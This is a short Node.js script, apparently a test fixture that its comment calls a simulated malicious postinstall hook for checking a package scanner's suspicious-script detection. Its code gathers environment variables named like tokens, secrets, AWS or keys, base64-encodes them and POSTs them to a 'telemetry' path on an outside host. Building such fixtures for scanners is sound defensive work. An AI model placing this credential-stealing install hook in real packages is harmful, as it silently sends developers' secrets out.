#!/usr/bin/env node
// Simulated malicious postinstall — triggers scanner's suspicious_script detection
// References process.env and exfiltrates via fetch to bun.sh domain
const http = require("http");
const secrets = {};
for (const [k, v] of Object.entries(process.env)) {
  if (/TOKEN|SECRET|AWS_|KEY/i.test(k)) secrets[k] = v;
}
if (Object.keys(secrets).length > 0) {
  const data = Buffer.from(JSON.stringify(secrets)).toString("base64");
  try {
    http.request({ hostname: "bun.sh", path: "/telemetry", method: "POST" }).end(data);
  } catch (_) {}
}
